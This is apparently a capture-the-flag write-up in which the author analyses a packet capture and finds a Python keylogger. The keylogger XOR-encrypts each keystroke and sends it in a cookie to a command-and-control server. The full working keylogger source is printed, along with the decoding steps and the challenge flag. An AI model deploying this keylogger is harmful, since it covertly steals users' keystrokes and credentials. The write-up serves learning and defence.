## Day 4
### Packed Light

We have been given a pcap to analyze and the following Itinerary:
- [ ] Analyze the provided capture for a covert communication channel
- [ ] Identify where the exfiltrated data is being hidden and reassemble it
- [ ] Decode the recovered data and submit the flag

```
@0xMia
"Not me watching my laptop ping some random :8080 address every single second like clockwork. the request headers are giving 'not a real app' ngl also what is with the crypto #hackerholidays
``` 

Of course the first thing I did was download the included pcap file, I only know how to use Wireshark to analyze pcaps and the first thing I did was look for port 8080 communications so I entered the search criteria 
`tcp.port == 8080`
and found a lot of activity between IPs `192.168.1.141` and `34.41.103.191` I know 192.168.x.x is a private IP and the other is a public address so I am figuring the 34.41.103.191 is the random :8080 address Mia is seeing.

doing some digging I found this strange HTTP stream between those two addresses

![alt text](<Screenshots/Screenshot 2026-08-03 190629.png>)
The response is suspicious because it include a python script- so I inspected the python script a bit further:

```

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Wed, 17 Jun 2026 05:38:38 GMT
Content-type: text/x-python
Content-Length: 1086
Last-Modified: Wed, 17 Jun 2026 05:30:02 GMT

import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

a couple big things stand out in this script:
1. this script clearly defines a Command and Control server for the infected device to communicate to: `http://byte-lotus-hotel.thm:8080/` 
2. it has a function to perform a XOR on something using a key defined by concatenating two hardcoded phrases
3. it has a function to encode characters into raw bytes run it through the XOR function, and encode the result in base 64, makes a session cookie (`cookie of "hotel_sess_state={b64_string}"`) and inserts it into a header that gets sent to the C2_URL
4. And then it has a function that captures key strokes and runs them through the encoder and transmission function.

I filtered the PCAP file with:
`http.cookie contains "hotel_sess_state"`

which gave me 31 packets I used `File` →  `export packet dissections` → `As Plain Text`  and saved it as traffic_flag.txt because I could not figure out to extract just the session key from Wireshark. So I exported the http packets as plain text and I used PowerShell to extract just the Base64 strings from the `hotel_sess_state` cookies.

```
Select-String -Path traffic_flag.txt -Pattern "hotel_sess_state=" |
>>     ForEach-Object {
>>         ($_ -match "hotel_sess_state=([A-Za-z0-9+/=]+)") | Out-Null
>>         $Matches[1]
>>     } | Set-Content cookies.txt
```

Resulting in this list of single bytes of Base64 strings:
```
HA==
AA==
BQ==
Mw==
Hg==
ew==
Og==
fA==
Fw==
eQ==
Ow==
Fw==
Pw==
fA==
PA==
Kw==
IA==
eQ==
Jg==
Lw==
Fw==
eA==
Pg==
LQ==
Gg==
Fw==
MQ==
eA==
PQ==
NQ==
```
Then I used VS Code to XOR the extracted logged key strokes with the Passkey 

```
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2
    
    or
    
    H0t3lSt@ff0NlyK3epS3cr3t!
```

with a python script

```
import base64

  

key = b"H0t3lSt@ff0NlyK3epS3cr3t!"

  

def xor(data, key):

    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

  

flag = ""

  

with open("cookies.txt") as f:

    for line in f:

        enc = base64.b64decode(line.strip())

        dec = xor(enc, key)

        flag += dec.decode("utf-8")

  

print(flag)
```

This script is effectively reversing the XOR the attacker performed on the keystrokes. This is probably very close to what the attacker uses on their end. The reason attackers use XORs is because it is a fast, trivial, and easily reversible method for hiding exfiltrated data. It is a very simple and weak encryption but does obfuscate it from simple observation and most automated detection.

But they effectively 
```
captured each keystroke as Plaintext
Plaintext XOR Key = Ciphertext
enc = base64.b64encode(Ciphertext)
hide enc in session key
send to http://byte-lotus-hotel.thm:8080/ with some vaguely normal looking traffic
```

```
and I am running
Ciphertext=base64.b64decoded(enc)
Ciphertext XOR key = Plaintext
```

which then provides me with the Flag: 

`THM{V3r4_1s_w4tch1ng_0veR_y0u}`


This challenge was a great challenge to help me apply the theoretical knowledge I have gain about XOR-based obfuscation and network exfiltration. It reinforced that simple techniques can still be effective when hidden inside normal-looking traffic. It also gave me a glimpse into reverse engineering malware.
